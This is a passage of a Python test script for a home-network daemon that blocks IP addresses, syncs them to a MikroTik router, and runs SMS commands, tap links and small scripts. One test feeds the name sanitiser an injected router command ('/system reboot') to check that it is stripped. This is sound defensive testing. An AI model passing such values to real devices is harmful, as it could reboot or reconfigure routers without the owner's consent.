                      'mikrotik_user': 'zigmon', 'mikrotik_auth': 'key', 'mikrotik_sync': 0})
d.store.unblock()
d.store.block('89.24.9.1', None, 'three wrong secrets', auto=True)
_sent = []


def _pretend(cmd):
    _sent.append(cmd)
    if 'print terse' in cmd:
        return ('0 list=zigmon address=10.9.9.9 comment="a hand-made entry"\n'
                '1 list=zigmon address=89.24.5.7 timeout=30m comment="zigmon: gone from here"\n')
    return ''


d.mikrotik_run = _pretend
_out = d.mikrotik_sync('a test')
assert _out['added'] == 1 and _out['removed'] == 1 and _out['kept'] == 1, 'the sync did the wrong thing: %r' % _out
assert any('add list=zigmon address=89.24.9.1' in c for c in _sent), 'the new one was not added'
assert any('remove [find list=zigmon address=89.24.5.7 comment~"^zigmon:"]' in c for c in _sent), \
    'the one no longer blocked was not taken off'
assert not any('10.9.9.9' in c for c in _sent), 'it touched an entry somebody else made'
assert all('list=zigmon' in c for c in _sent), 'it touched something outside the one list'
assert not any('remove' in c and 'comment~' not in c for c in _sent), \
    'a removal that does not insist on the mark could take away anybody\u2019s entry'
# a list name is held to the letters a list name may have, since it ends up in
# a command line on the router
assert d.mikrotik_name('zig mon; /system reboot') == 'zigmonsystemreboot'
assert d.mikrotik_name('../x') == 'x'
for _bad in ('', '   ', ';;;'):
    try:
        d.mikrotik_name(_bad)
        raise AssertionError('an empty list name was allowed')
    except ValueError:
        pass
print('the router is told about one list only, and only about entries this one made')

# A change here reaches the router at once, not at the next sweep: an address
# blocked is a rule there a moment later.
zigmon.CONFIG['mikrotik_sync'] = 1
_sent[:] = []
_t0 = time.time()
d.store.block('89.24.7.7', None, 'by hand', auto=False)
d.mikrotik_after_change()
time.sleep(0.4)
assert _sent, 'a change here never reached the router'
assert time.time() - _t0 < 1.0, 'it took its time about it'
assert any('address=89.24.7.7' in c for c in _sent), 'the new one was not put there'
zigmon.CONFIG['mikrotik_sync'] = 0
print('a change here is on the router within the second')

# Each line says whether the router is carrying it too, as the last look found
# it - and nothing at all where no router is in use, rather than a mark that
# would mean "no" when it means "there is no router".
zigmon.CONFIG['mikrotik_host'] = ''
assert all(r['router'] == '' for r in d.blocked_list()), 'it marks a router that is not there'
zigmon.CONFIG['mikrotik_host'] = 'r'
d.store.set_meta('mikrotik_seen', '')
assert all(r['router'] == 'no' for r in d.blocked_list()), 'unlooked-at reads as carried'
d.mikrotik_run = lambda cmd: ('0 list=zigmon address=89.24.7.7 comment="zigmon: by hand"\n'
                              if 'print terse' in cmd else '')
d.mikrotik_entries()
_marks = {r['ip']: r['router'] for r in d.blocked_list()}
assert _marks.get('89.24.7.7') == 'yes', 'one the router holds is not marked: %r' % _marks
assert all(v == 'no' for k, v in _marks.items() if k != '89.24.7.7'), 'everything was marked carried'
print('each line says whether the router is carrying it, and says nothing where there is none')

# An address written under "never kept out" beats a block by hand as surely as
# one made by the detector: it stays on the list to be seen, does nothing at
# all, and is never given to the router.
zigmon.CONFIG['never_block'] = '192.168.1.0/24, 89.24.9.9'
d.store.unblock()
d.store.block('192.168.1.120', None, 'by hand', auto=False)
d.store.block('89.24.9.9', None, 'by hand', auto=False)
d.store.block('89.24.5.7', None, 'a stranger', auto=True)
_rows = {r['ip']: r for r in d.blocked_list()}
assert _rows['192.168.1.120']['spared'] == '192.168.1.0/24', 'a range does not spare its addresses'
assert _rows['89.24.9.9']['spared'] == '89.24.9.9', 'an address written out does not spare itself'
assert not _rows['89.24.5.7']['spared'], 'it spared somebody it was not asked to'
assert _rows['192.168.1.120']['router'] == '', 'a spared one is marked as the router might carry it'


class _Sparing(object):
    headers = {'X-Zigmon-Client': '192.168.1.120'}
    client_address = ('127.0.0.1', 1)
    daemon = d
    _who = zigmon.ApiHandler._who
    _caller = zigmon.ApiHandler._caller
    _shut_out = zigmon.ApiHandler._shut_out

    def _send(self, *a):
        raise AssertionError('a spared address was turned away')


assert _Sparing()._shut_out(d) is False, 'a spared address was kept out'
_sent[:] = []
d.mikrotik_run = lambda c: (_sent.append(c) or
                            ('0 list=zigmon address=192.168.1.120 comment="zigmon: old"\n'
                             if 'print terse' in c else ''))
_out = d.mikrotik_sync('a test')
assert not any('address-list add' in c and '192.168.1.120' in c for c in _sent), \
    'a spared one was given to the router'
assert any('address-list remove' in c and '192.168.1.120' in c for c in _sent), \
    'a spared one already on the router was left there'
zigmon.CONFIG['never_block'] = ''
d.store.unblock()
print('what is never kept out is shown, does nothing, and never reaches the router')

# The whole of it in both families. A Mikrotik keeps its two address lists
# apart and will not take one in the other's list, so which list an address
# belongs in is read off the address; the name is the same in both.
assert d.mikrotik_family('89.24.5.7') == '/ip'
assert d.mikrotik_family('89.24.5.0/24') == '/ip'
assert d.mikrotik_family('2a01:430:17::5') == '/ipv6'
assert d.mikrotik_family('2a01:430:17::/48') == '/ipv6'
assert d.mikrotik_family('nonsense') is None
zigmon.CONFIG['never_block'] = '2a01:430:17::/48'
d.store.unblock()
d.store.block('2a02:1:2::9', None, 'a stranger on v6')
d.store.block('2a01:430:17::5', None, 'ours')
d.store.block('89.24.5.7', None, 'a stranger on v4')
_marks = {r['ip']: r['spared'] for r in d.blocked_list()}
assert _marks['2a01:430:17::5'] == '2a01:430:17::/48', 'a v6 range does not spare its addresses'
assert not _marks['2a02:1:2::9'] and not _marks['89.24.5.7'], 'it spared somebody else'
assert d.store.blocked_until('2a01:430:17::9') is None, 'a v6 address outside every block was kept out'
d.store.block('2a03:beef::/32', None, 'a v6 street')
assert d.store.blocked_until('2a03:beef::1234') == 0, 'a v6 range keeps nobody out'
assert d.store.blocked_until('2a04:beef::1') is None, 'a v6 range keeps out more than it holds'
_sent[:] = []
d.mikrotik_run = lambda c: (_sent.append(c) or '')
d.mikrotik_sync('a test')
assert any('/ipv6 firewall address-list add' in c and '2a02:1:2::9' in c for c in _sent), \
    'a v6 address was not put in the v6 list'
assert any('/ip firewall address-list add' in c and '89.24.5.7' in c for c in _sent), \
    'a v4 address was not put in the v4 list'
assert not any('2a01:430:17::5' in c for c in _sent), 'a spared v6 address reached the router'
assert any(c.startswith('/ipv6 firewall address-list print') for c in _sent), 'the v6 list is never read'
_lines = d.blocked_mikrotik()
assert any(x.startswith('/ipv6 ') for x in _lines) and any(x.startswith('/ip ') for x in _lines), \
    'the lines to paste know only one family'
assert not any('2a01:430:17::5' in x for x in _lines), 'a spared one is in the lines to paste'
zigmon.CONFIG['never_block'] = ''
d.store.unblock()
print('both families, in their own lists, with ranges and the sparing over each')

# The mark must be right whichever way the router chose to write an address,
# and must say so when the looking itself failed rather than reading as "not
# carried" for ever.
d.store.unblock()
d.store.block('2a01:430:17::5', None, 'v6')
d.store.block('89.24.5.7', None, 'v4')
d.mikrotik_run = lambda c: ('0 list=zigmon address=2A01:0430:17:0000::0005 comment="zigmon: v6"\n'
                            '1 list=zigmon address=89.24.5.7 comment="zigmon: v4"\n'
                            if 'print terse' in c else '')
d.mikrotik_entries()
_marks = {r['ip']: r['router'] for r in d.blocked_list()}
assert _marks['2a01:430:17::5'] == 'yes', 'the same v6 address written two ways read as two'
assert _marks['89.24.5.7'] == 'yes'


def _unreachable(cmd):
    raise RuntimeError('ssh: connect to host r port 22: No route to host')


d.mikrotik_run = _unreachable
d._mikrotik_peek()
assert any(r['router_trouble'] for r in d.blocked_list()), 'a router that cannot be read says nothing'
d.store.set_meta('mikrotik_trouble', '')
d.store.unblock()
print('the mark reads an address as an address, and says when the router could not be read')

# Syncing must be the same on the second run as on the first. A router writes
# an address its own way, and comparing those as letters made every IPv6 entry
# look missing: it was added again every time, and the router answered
# "already have such entry" every time.
d.store.unblock()
d.store.block('2a01:430:17::5', None, 'already there')
d.store.block('89.24.5.7', None, 'already there')
d.store.block('2a02:9:9::1', None, 'new')
_held = {'/ipv6': {'2A01:0430:17:0000::0005'}, '/ip': {'89.24.5.7'}}
_writes = []


def _router(cmd):
    fam = '/ipv6' if cmd.startswith('/ipv6') else '/ip'
    if 'print terse' in cmd:
        return ''.join('%d list=zigmon address=%s comment="zigmon: x"\n' % (i, a)
                       for i, a in enumerate(sorted(_held[fam])))
    _writes.append(cmd)
    found = re.search(r'address=([0-9a-fA-F:.]+)', cmd)
    if 'address-list add' in cmd:
        _held[fam].add(found.group(1).upper() if ':' in found.group(1) else found.group(1))
    else:
        _held[fam] = {a for a in _held[fam] if a.lower() != found.group(1).lower()}
    return ''


d.mikrotik_run = _router
_first = d.mikrotik_sync('first')
assert _first['added'] == 1, 'it added %d, when one was new' % _first['added']
for _again in range(2):
    _writes[:] = []
    _out = d.mikrotik_sync('again')
    assert not _writes, 'a sync with nothing changed wrote %d command(s): %r' % (len(_writes), _writes)
    assert _out['added'] == 0 and _out['removed'] == 0, 'it found work to do twice over: %r' % _out
d.store.unblock()
print('a sync with nothing changed writes nothing, whichever way the router spells an address')

# A Mikrotik keeps an address-list entry as a prefix and prints it as one: an
# address given as 2a01:430:17::5 comes back as 2a01:430:17::5/128. Reading
# that as a range of its own made every IPv6 entry look missing, so it was
# added again on every sync and the router said "already have such entry"
# every time.
assert d.same_address('2a01:430:17::5/128') == '2a01:430:17::5', 'a /128 is not read as one address'
assert d.same_address('89.24.5.7/32') == '89.24.5.7', 'a /32 is not read as one address'
assert d.same_address('89.24.5.0/24') == '89.24.5.0/24', 'a real range was flattened'
assert d.same_address('2a01:430::/48') == '2a01:430::/48'
d.store.unblock()
d.store.block('2a01:430:17::5', None, 'v6')
d.store.block('89.24.5.7', None, 'v4')
_writes = []


def _prefix_router(cmd):
    fam = '/ipv6' if cmd.startswith('/ipv6') else '/ip'
    if 'print terse' in cmd:
        return ('0 list=zigmon address=2A01:430:17::5/128 comment="zigmon: v6"\n' if fam == '/ipv6'
                else '0 list=zigmon address=89.24.5.7 comment="zigmon: v4"\n')
    _writes.append(cmd)
    return ''


d.mikrotik_run = _prefix_router
_out = d.mikrotik_sync('a test')
assert not _writes, 'it wrote to a router that already held everything: %r' % _writes
d.mikrotik_entries()
assert all(r['router'] == 'yes' for r in d.blocked_list()), \
    'an address the router holds as a prefix is marked as missing'
d.store.unblock()
print('an address the router keeps as a /128 is the same address, on the list and on the mark')

# A phrase may name what it catches, and a press may carry named values, so
# one command and one link serve every address rather than one of each per
# address.
assert zigmon.Daemon.phrase_match('unban {ip}', 'unban 1.1.1.1') == {'ip': '1.1.1.1'}
assert zigmon.Daemon.phrase_match('unban {ip}', 'UNBAN 2a01:430::5') == {'ip': '2a01:430::5'}
assert zigmon.Daemon.phrase_match('unban {ip}', 'ban 1.1.1.1') is None, 'it matched another command'
assert zigmon.Daemon.phrase_match('set {room} to {temp}', 'set loznice to 21.5') == \
    {'room': 'loznice', 'temp': '21.5'}
assert zigmon.Daemon.phrase_match('lights', 'lights off') == {}, 'a plain phrase stopped matching'
d.store.set_meta('sms_commands', json.dumps([
    {'phrase': 'unban {ip}', 'do': 'unban', 'target': '{ip}', 'enabled': True,
     'from_anyone': True, 'answer': True},
    {'phrase': 'ban {ip}', 'do': 'ban', 'target': '{ip}', 'enabled': True,
     'from_anyone': True, 'answer': True}]))
zigmon.CONFIG['sms_reply'] = 0
d.store.unblock()
d.store.block('1.1.1.1', None, 'a test')
d.sms_handle('+420123', 'unban 1.1.1.1')
assert not d.blocked_list(), 'a text saying "unban 1.1.1.1" did not let it back in'
d.sms_handle('+420123', 'ban 9.9.9.9')
assert [r['ip'] for r in d.blocked_list()] == ['9.9.9.9'], 'a text saying "ban" did not keep it out'
assert 'not an address' in d.ban_by_name('ban', 'rubbish'), 'it took rubbish for an address'
d.store.unblock()
# and the same by a press carrying the address in a header of its own; the
# links the rest of this file works with are put back afterwards
_was_taps = d.taps()
d.save_taps([{'name': 'Unban', 'target': '{ip}', 'do': 'unban'}])
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 0
d.store.block('1.1.1.1', None, 'a test')
_ok, _answer = d.tap(d.taps()[0]['token'], '1.2.3.4', way='header', carried={'ip': '1.1.1.1'})
assert _ok and 'let back in' in _answer['message'], 'a press carrying an address did nothing: %r' % (_answer,)
assert not d.blocked_list(), 'the address is still kept out'
d.store.set_meta('taps', json.dumps(_was_taps))
print('a phrase catches what it names, and a press carries what it is given')

# The same refusal over and over is one thing that happened, not many. A
# browser asked once will often ask again by itself, and each of those was a
# line of its own and a weight of its own: opening one wrong address twice
# filled the log with ten lines and earned a block.
d.store.flush()                    # anything still on its way to the disk, first
d.store.forget_tap_log()
d.store.unblock()
d._anomaly.clear()
zigmon.CONFIG.update({'tap_mode': 'both', 'blacklist': 1, 'block_score': 15})
for _i in range(6):
    d.tap('one-wrong-secret', '89.24.50.1', way='link')
d.store.flush()
_rows, _m, _t = d.store.tap_log(20)
assert len(_rows) == 1, 'six of the same refusal made %d lines' % len(_rows)
assert _rows[0]['times'] == 6, 'the line does not say how many: %r' % _rows[0]['times']
assert d.store.blocked_until('89.24.50.1') is None, 'a browser retrying earned a block'
assert [c['tries'] for c in d.anomaly_state() if c['ip'] == '89.24.50.1'] == [1], \
    'a retry was weighed as a try of its own'
# six different secrets is a different thing and must stay six lines
d.store.forget_tap_log()
d._anomaly.clear()
for _i in range(6):
    d.tap('wrong-%d' % _i, '89.24.50.2', way='link')
d.store.flush()
_rows, _m, _t = d.store.tap_log(20)
assert len([r for r in _rows if r['who'] == '89.24.50.2']) == 6, \
    'six different secrets were folded into %d line(s)' % len(_rows)
# and a press that works is never folded away
d.store.unblock()
_tok = d.taps()[0]['token']
d.store.forget_tap_log()
for _i in range(3):
    d.tap(_tok, '10.0.0.50', way='link')
d.store.flush()
_rows, _m, _t = d.store.tap_log(20)
assert len([r for r in _rows if r['who'] == '10.0.0.50']) == 3, 'real presses were folded together'
d.store.forget_tap_log()
d.store.unblock()
print('the same refusal repeated is one line saying how many, and weighs once')

# A row may make up names of its own and say where each comes from. They
# belong to that row: one called ip here means nothing on the next line.
_kept = d.save_sms_commands([{'phrase': 'unban', 'do': 'unban', 'target': '{ip}',
                              'reply': 'let {ip} back in', 'from_anyone': True,
                              'vars': [{'name': 'ip', 'from': 'rest', 'note': 'the address'},
                                       {'name': '', 'from': 'x'},        # no name: dropped
                                       {'name': 'ip', 'from': 'again'}]}])  # twice: kept once
assert [v['name'] for v in _kept[0]['vars']] == ['ip'], 'the names were not tidied: %r' % _kept[0]['vars']
assert _kept[0]['do'] == 'unban' and _kept[0]['target'] == '{ip}', 'the action did not survive saving'
zigmon.CONFIG['sms_reply'] = 0
d.store.unblock()
d.store.block('1.1.1.1', None, 'a test')
d.sms_handle('+420123', 'unban 1.1.1.1')
assert not d.blocked_list(), 'a name declared on the row was not caught from the message'
# a name written into the phrase counts as one of them whether or not it was
# written down here as well
_kept = d.save_sms_commands([{'phrase': 'ban {ip}', 'do': 'ban', 'target': '{ip}',
                              'reply': 'kept {ip} out', 'from_anyone': True}])
assert [v['name'] for v in _kept[0]['vars']] == ['ip'], 'a name in the phrase is not one of them'
assert _kept[0]['vars'][0]['from'] == 'phrase'
# and a link may name the header each of its own comes in
d.save_taps([{'name': 'Unban', 'target': '{ip}', 'do': 'unban',
              'vars': [{'name': 'ip', 'from': 'X-Zigmon-Arg-Address'}]}])
d.store.unblock()
d.store.block('2.2.2.2', None, 'a test')
zigmon.CONFIG['tap_mode'] = 'header'
_ok, _answer = d.tap(d.taps()[0]['token'], '1.2.3.4', way='header', carried={'address': '2.2.2.2'})
assert _ok and 'let back in' in _answer['message'], 'a link did not read its name from the header it named'
d.store.unblock()
d.save_sms_commands([])
d.store.set_meta('taps', json.dumps(_was_taps))   # the links the rest of this file works with
zigmon.CONFIG['tap_mode'] = 'both'
print('a row may make up names of its own, and they belong to that row')

# The box beside a name says which part of the message it takes. It said
# nothing at all before, which made it a control that did nothing.
def _caught(vars_, text, phrase='set'):
    _c = {'phrase': phrase, 'vars': [dict(v) for v in vars_]}
    _f = d.sms_facts('+420', text, None, _c)
    return {v['name']: _f.get(v['name']) for v in vars_}


assert _caught([{'name': 'room', 'from': ''}, {'name': 'temp', 'from': ''}], 'set loznice 21.5') == \
    {'room': 'loznice', 'temp': '21.5'}, 'names left empty do not take the words in order'
assert _caught([{'name': 'temp', 'from': '2'}, {'name': 'room', 'from': '1'}], 'set loznice 21.5') == \
    {'temp': '21.5', 'room': 'loznice'}, 'a number does not take that word'
assert _caught([{'name': 'note', 'from': 'all'}], 'set the boiler is loud') == \
    {'note': 'the boiler is loud'}, '"all" does not take everything after the phrase'
assert _caught([{'name': 'x', 'from': '9'}], 'set one') == {'x': ''}, 'a word past the end is not empty'
print('the box beside a name says which part of the message it takes')

# The dashboard meeting its own lock is not somebody trying the handle: a
# reload asks for the views that want the PIN, several times over, and every
# one of those was counted against the address that made it.
d.store.unblock()
d.forget_anomaly()
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_private': 'gently'})
for _i in range(30):
    d.note_anomaly('192.168.40.12', 'locked-read', '/api/blocked')
assert d.store.blocked_until('192.168.40.12') is None, 'reloading the page earned a block'
# and a right PIN forgets whatever was held
d.note_anomaly('192.168.40.12', 'bad-secret', 'x')
assert d.anomaly_state(), 'nothing was held to forget'
# ...signing in with the right password, since 5.19
if 'taps-owner' not in d.accounts:
    d.account_add('taps-owner', 'admin', 'owner pass 12', must_change=False, quiet=True)
assert d.login('taps-owner', 'owner pass 12', '192.168.40.12 (says 89.24.5.7)')[0], 'the owner could not sign in'
assert not [c for c in d.anomaly_state() if c['ip'] == '192.168.40.12'], \
    'the right PIN did not clear what was held against that address'
d.forget_anomaly()
print('the dashboard meeting its own lock costs nothing, and a right PIN clears the slate')

# ...and that has to be true of the road the dashboard actually takes. There
# are two places that refuse a locked read; 3.85.2 took the counting out of
# one of them, and the other is the one the Public API tab meets twice a
# second, so a reload went on filling the owner's own account.
_src = open(str(__file__).rsplit('/', 2)[0] + '/zigmon.py').read()
assert "note_anomaly(self._caller(), 'locked-read'" not in _src, \
    'a locked read is still counted against whoever asked for it'

# A rule does one thing; a script is a name for three. Every line is a plain
# verb and something to act on, checked when it is saved rather than when it
# runs, and the rule's own names are filled in before anything happens.
zigmon.CONFIG.update({'blacklist': 1, 'sms_reply': 0, 'block_mode': 'permanent'})
d.store.unblock()
_kept = d.save_scripts([{'name': 'Keep out', 'body': 'ban {ip} 120\nsay {ip} is kept out'}])
assert len(_kept) == 1 and _kept[0]['id'], 'a script was not kept'
_out = d.run_script(_kept[0], {'ip': '1.2.3.4'}, 'a test')
assert _out['lines'] == 2, 'it ran %d line(s) of two' % _out['lines']
assert '1.2.3.4' in _out['said'], 'the names were not filled in: %r' % _out['said']
_row = [r for r in d.blocked_list() if r['ip'] == '1.2.3.4'][0]
assert not _row['forever'] and 100 * 60 < _row['left'] <= 120 * 60, \
    'the number of minutes on the line was not used: %r' % _row
# a line that cannot work is refused while somebody is looking at it
for _bad in ('fly to the moon', 'set', 'on', 'ban'):
    try:
        d.save_scripts([{'name': 'X', 'body': _bad}])
        raise AssertionError('%r was accepted as a line' % _bad)
    except ValueError:
        pass
# and a command may point at one, catching what it needs from the message
d.save_scripts(_kept)
d.store.unblock()
d.save_sms_commands([{'phrase': 'block', 'target': 'script:' + _kept[0]['id'], 'do': 'script',
                      'from_anyone': True, 'vars': [{'name': 'ip', 'from': 'rest'}]}])
_saved = d.sms_commands()[0]
assert _saved['do'] == 'script' and _saved['target'].startswith('script:'), \
    'a script did not survive being saved as an action: %r' % _saved
d.sms_handle('+420123', 'block 89.24.5.7')
assert [r['ip'] for r in d.blocked_list()] == ['89.24.5.7'], 'the script did not run for the message'
d.save_sms_commands([])
d.save_scripts([])
d.store.unblock()
print('a script is a name for three things, checked when it is saved and run with the rule\'s names')

# A script says which names it expects, and a name that stands for nothing is
# said plainly rather than leaving a hole in the middle of a line: "ban {ip}
# 120" with no address would otherwise read as "ban 120".
_kept = d.save_scripts([{'name': 'Ban', 'body': 'ban {myip} 120\nsay {myip} is kept out\nsay always'}])
assert d.scripts()[0]['wants'] == ['myip'], 'it does not say what it wants: %r' % d.scripts()[0]
_said = d.run_script(d.scripts()[0], {}, 'a test')['said']
assert 'stood for nothing' in _said, 'a name standing for nothing was not said: %r' % _said
assert 'is not an address' not in _said, 'it tried to act on what was left of the line'
assert 'always' in _said, 'a line needing no name was skipped too'
_said = d.run_script(d.scripts()[0], {'myip': '9.9.9.9'}, 'a test')['said']
assert '9.9.9.9 is kept out for 120 min' in _said, 'given a value it did not use it: %r' % _said
d.save_scripts([])
d.store.unblock()
print('a script says which names it wants, and says so when one stands for nothing')


# A script can ask a question and go round a list. Until now every line ran
# every time, so "switch the lights off when nobody is home" had to be two
# rules and a scene; and there was no way at all to do something to each of
# the sockets that happen to be on.
_blocks = d.save_scripts([{'name': 'Asking', 'body': '\n'.join([
    'if {count} > 2',
    '  say a lot: {count}',
    'else if {count} > 0',
    '  say a few: {count}',
    'else',
    '  say none at all',
    'end',
    'for one in {things}',
    '  say {loop_i}/{loop_n} {one}',
    'end',
    'if not {who}',
    '  say nobody said who',
    'end',
    'say done'])}])
_r = d.run_script(_blocks[0], {'count': '3', 'things': 'A, B', 'who': ''}, 'a test')
assert _r['said'].splitlines() == ['a lot: 3', '1/2 A', '2/2 B', 'nobody said who', 'done'], \
    'the blocks did not run as written: %r' % _r['said']
assert not _r['faults'], _r['faults']
_r = d.run_script(_blocks[0], {'count': '1', 'things': 'nothing', 'who': 'Falco'}, 'a test')
assert _r['said'].splitlines() == ['a few: 1', 'done'], 'the other branch: %r' % _r['said']
_r = d.run_script(_blocks[0], {'count': '0', 'things': '', 'who': 'Falco'}, 'a test')
assert _r['said'].splitlines() == ['none at all', 'done'], 'the else: %r' % _r['said']
# and and / or / not, comparing words as well as numbers
_more = d.save_scripts([{'name': 'Asking', 'body': '\n'.join([
    'if {who} contains Falco and {count} >= 2',
    '  say both',
    'end',
    'if {who} contains Karel or {count} == 2',
    '  say either',
    'end',
    'for p in {things}',
    '  if {p} contains UPS',
    '    say the UPS',
    '  end',
    'end'])}])
_r = d.run_script(_more[0], {'who': 'Falco, Jana', 'count': '2', 'things': 'Plug-UPS, Plug-TV'}, 'a test')
assert _r['said'].splitlines() == ['both', 'either', 'the UPS'], _r['said']
# a block that is never ended is refused while somebody is looking at it, and
# so is one that ends nothing
for _bad, _why in (('if {x} > 1\nsay hi', 'never ended'), ('end', 'without an if'),
                   ('if\nsay hi\nend', 'needs something to ask'),
                   ('for p\nsay hi\nend', 'for a name in a list')):
    try:
        d.save_scripts([{'name': 'X', 'body': _bad}])
        raise AssertionError('%r was accepted' % _bad)
    except ValueError as _e:
        assert _why in str(_e), '%r was refused with %r' % (_bad, str(_e))
# a list of five hundred goes round two hundred times and no more
_long = d.save_scripts([{'name': 'Long', 'body': 'for p in {things}\n  say {p}\nend'}])
_r = d.run_script(_long[0], {'things': ', '.join(str(n) for n in range(500))}, 'a test')
assert len(_r['said'].splitlines()) == 200, \
    'a loop of five hundred was not held: %d line(s)' % len(_r['said'].splitlines())
# and a loop inside a loop stops at the whole script's limit rather than
# running for the rest of the afternoon
_deep = d.save_scripts([{'name': 'Deep',
                         'body': 'for a in {things}\n  for b in {things}\n    say {a}{b}\n  end\nend'}])
_r = d.run_script(_deep[0], {'things': ', '.join(str(n) for n in range(30))}, 'a test')
assert 'does not end' in _r['said'] and len(_r['said'].splitlines()) <= d.SCRIPT_LINES_MOST + 2, \
    'a loop inside a loop was not held: %d line(s)' % len(_r['said'].splitlines())
# the things a script can do are all offered to whoever writes one
_verbs = {v[0] for v in d.SCRIPT_VERBS}
assert {'if', 'else', 'end', 'for', 'while', 'repeat', 'break', 'next', 'let'} <= _verbs, \
    'the blocks are not among the verbs offered'

# repeat, while, a name of your own, and the two ways out of a loop
_more2 = d.save_scripts([{'name': 'Loops', 'body': '\n'.join([
    'repeat 3',
    '  say turn {loop_i} of {loop_n}',
    'end',
    'let n 0',
    'while {n} < 2',
    '  say while {loop_i}',
    '  let n {loop_i}',
    'end',
    'for p in A, B, C',
    '  if {p} == B',
    '    next',
    '  end',
    '  if {p} == C',
    '    break',
    '  end',
    '  say kept {p}',
    'end',
    'let room 21.5',
    'say it is {room} in there'])}])
_r = d.run_script(_more2[0], {}, 'a test')
assert _r['said'].splitlines() == ['turn 1 of 3', 'turn 2 of 3', 'turn 3 of 3',
                                   'while 1', 'while 2', 'kept A', 'it is 21.5 in there'], \
    'the loops did not run as written: %r' % _r['said']
assert not _r['faults'], _r['faults']
# a while that never stops is stopped
_never = d.save_scripts([{'name': 'Never', 'body': 'while yes\n  say round\nend'}])
_r = d.run_script(_never[0], {}, 'a test')
assert 'went round' in _r['said'] and len(_r['said'].splitlines()) <= d.SCRIPT_TURNS_MOST + 2, \
    'a while that never ends was not stopped: %d line(s)' % len(_r['said'].splitlines())
# and the new blocks are refused when they are written wrong
for _bad, _why in (('while\nsay hi\nend', 'needs something to ask'),
                   ('repeat\nsay hi\nend', 'needs a number'),
                   ('let\nsay hi', 'let goes'),
                   ('repeat 2\nsay hi', 'never ended')):
    try:
        d.save_scripts([{'name': 'X', 'body': _bad}])
        raise AssertionError('%r was accepted' % _bad)
    except ValueError as _e:
        assert _why in str(_e), '%r was refused with %r' % (_bad, str(_e))
d.save_scripts([])
print('a script can ask a question, go round a list, and is refused when a block is left open')


# What a script leaves behind, and who may quote it. A text message and a
# one-tap link both answer with words somebody wrote, and those words could
# only hold what was known BEFORE the script ran: a script that worked
# something out had no way of saying it back.
zigmon.CONFIG.update({'sms_reply': 1, 'blacklist': 1})
_kept = d.save_scripts([{'name': 'Ask', 'body': '\n'.join([
    'let room Loznice',
    'let degrees 21.5',
    'say working it out',
    'if {degrees} > 20',
    '  answer {room} is warm at {degrees} degrees',
    'else',
    '  answer {room} is cold',
    'end'])}])
_out = d.run_script(_kept[0], {'who': 'Falco'}, 'a test')
assert _out['answer'] == 'Loznice is warm at 21.5 degrees', _out
assert _out['said'] == 'working it out', _out['said']
assert _out['names'].get('room') == 'Loznice' and _out['names'].get('degrees') == '21.5', _out['names']
assert not [k for k in _out['names'] if k.startswith('loop_')], 'the loop marks leaked into the names'
_after = d.script_result_facts(_out, _kept[0])
assert _after['result'] == _out['answer'] and _after['said'] == 'working it out' \
    and _after['ok'] == 'yes' and _after['script'] == 'Ask' and _after['room'] == 'Loznice', _after
# a text message: the command's own answer may quote all of it
_sent = []
_was_send = d.sms_send
d.sms_send = lambda number, text, **k: (_sent.append((number, text)), (True, 'ok'))[1]


def daemon_fill(dd, text, facts):
    return dd.fill_message(text, facts)


def _waited(n=1):
    # an answer is queued and sent by a worker of its own, so it is waited for
    for _i in range(100):
        if len(_sent) >= n:
            return True
        time.sleep(0.05)
    return False


try:
    d.save_sms_commands([{'phrase': 'warm', 'target': 'script:' + _kept[0]['id'], 'do': 'script',
                          'from_anyone': True, 'reply': 'It says: {result} ({room}, {ok})'}])
    d.sms_handle('+420123', 'warm')
    assert _waited() and 'It says: Loznice is warm at 21.5 degrees (Loznice, yes)' in _sent[-1][1], \
        'the answer did not carry what the script worked out: %r' % (_sent[-1:],)
    # with no answer of its own, what the script answered goes back
    d.save_sms_commands([{'phrase': 'warm', 'target': 'script:' + _kept[0]['id'], 'do': 'script',
                          'from_anyone': True, 'reply': ''}])
    _sent[:] = []
    d.sms_handle('+420123', 'warm')
    assert _waited() and _sent[-1][1] == 'Loznice is warm at 21.5 degrees', _sent[-3:]
    # and a name the message carried still reaches the script and comes back
    _k2 = d.save_scripts([{'name': 'Ask', 'body': 'answer you said {word}, {word.upper}'}])
    d.save_sms_commands([{'phrase': 'echo', 'target': 'script:' + _k2[0]['id'], 'do': 'script',
                          'from_anyone': True, 'vars': [{'name': 'word', 'from': 'rest'}],
                          'reply': '{result}'}])
    _sent[:] = []
    d.sms_handle('+420123', 'echo hello')
    assert _waited() and _sent[-1][1] == 'you said hello, HELLO', _sent[-1:]
finally:
    d.sms_send = _was_send
    d.save_sms_commands([])
# a one-tap link: the same, with the link's own words if it has any
_k3 = d.save_scripts([{'name': 'Tap', 'body': 'let where garage\nanswer the {where} was opened'}])
_link = d.save_taps([{'name': 'Gate', 'target': 'script:' + _k3[0]['id'], 'do': 'run',
                      'text': 'Done: {result} ({where})', 'vars': [{'name': 'who', 'from': ''}]}])
_ok, _answer = d.tap_do(_link[0], carried={'who': 'Falco'}, way='a test', note=False)
assert _ok and _answer['message'] == 'Done: the garage was opened (garage)', _answer
# and with no words of its own, the script's answer is the answer
_link = d.save_taps([{'name': 'Gate', 'target': 'script:' + _k3[0]['id'], 'do': 'run', 'text': ''}])
_ok, _answer = d.tap_do(_link[0], carried={}, way='a test', note=False)
assert _ok and _answer['message'] == 'the garage was opened', _answer
d.save_taps([])
d.save_scripts([])
print('a script answers in its own words, and a text message or a link may quote what it worked out')


# Whose name is whose. Two commands may each have a name called ip and
# neither means the other's; two scripts may each give back a "room". So
# every name a caller hands over is also there as {sms.name}, {in.name} and
# under the caller's own word, and every name a script hands back is also
# {out.name} and {thatscript.name} - which is how "{Skript01.returnvar01}"
# means that script's, whatever else is in play.
_s1 = d.save_scripts([
    {'name': 'Skript01', 'body': 'let returnvar01 first\nanswer one',
     'results': [{'name': 'returnvar01', 'note': 'what it worked out'}]},
    {'name': 'Skript02', 'body': 'let returnvar01 second\nanswer two'}])
_one = [x for x in d.scripts() if x['name'] == 'Skript01'][0]
assert _one['slug'] == 'skript01' and _one['gives'] == ['returnvar01'], _one
_out1 = d.run_script(_one, {}, 'a test')
_f1 = d.script_result_facts(_out1, _one)
assert _f1['returnvar01'] == 'first' and _f1['out.returnvar01'] == 'first' \
    and _f1['skript01.returnvar01'] == 'first' and _f1['skript01.result'] == 'one', _f1
_two = [x for x in d.scripts() if x['name'] == 'Skript02'][0]
_f2 = d.script_result_facts(d.run_script(_two, {}, 'a test'), _two)
